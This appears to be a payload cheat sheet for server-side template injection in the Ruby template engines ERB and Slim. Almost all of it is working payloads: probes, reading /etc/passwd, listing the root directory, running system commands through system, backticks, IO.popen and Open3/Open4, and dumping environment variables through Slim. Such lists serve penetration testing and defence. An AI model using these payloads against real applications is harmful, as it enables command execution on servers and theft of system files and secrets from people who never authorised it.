# Server Side Template Injection - Ruby

## Summary

- [Ruby](#ruby)
    - [Ruby - Basic injections](#ruby---basic-injections)
    - [Ruby - Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
    - [Ruby - List files and directories](#ruby---list-files-and-directories)
    - [Ruby - Code execution](#ruby---code-execution)


## Ruby

### Ruby - Basic injections

**ERB**:

```ruby
<%= 7 * 7 %>
```

**Slim**:

```ruby
#{ 7 * 7 }
```

### Ruby - Retrieve /etc/passwd

```ruby
<%= File.open('/etc/passwd').read %>
```

### Ruby - List files and directories

```ruby
<%= Dir.entries('/') %>
```

### Ruby - Code execution

Execute code using SSTI for **ERB** engine.

```ruby
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

Execute code using SSTI for **Slim** engine.

```powershell
#{ %x|env| }
```

---